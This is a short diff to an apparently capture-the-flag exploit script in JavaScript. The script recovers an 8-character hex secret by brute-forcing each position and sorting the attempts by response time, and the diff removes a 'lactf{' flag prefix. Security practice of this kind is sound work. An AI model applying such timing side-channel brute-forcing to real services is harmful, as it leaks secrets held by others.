@@ -64,8 +64,8 @@ async function main() {
     document.getElementById("s").textContent = "Working...";
     
     try {
-        // The note is "lactf{SECRET}" so prefix with lactf{
-        var prefix = "lactf{";
+        // SECRET is just 8 hex chars, not lactf{SECRET}!
+        var prefix = "";
         var secret = "";
         
         for (var pos = 0; pos < 8; pos++) {
@@ -98,7 +98,7 @@ async function main() {
         // If that didn't work, maybe we need slowest
         // Rebuild with slowest
         secret = "";
-        prefix = "lactf{";
+        prefix = "";
         for (var pos = 0; pos < 8; pos++) {
             var results = await brutePosition(prefix + secret);
             results.sort(function(a, b) { return b.time - a.time; }); // Slowest first
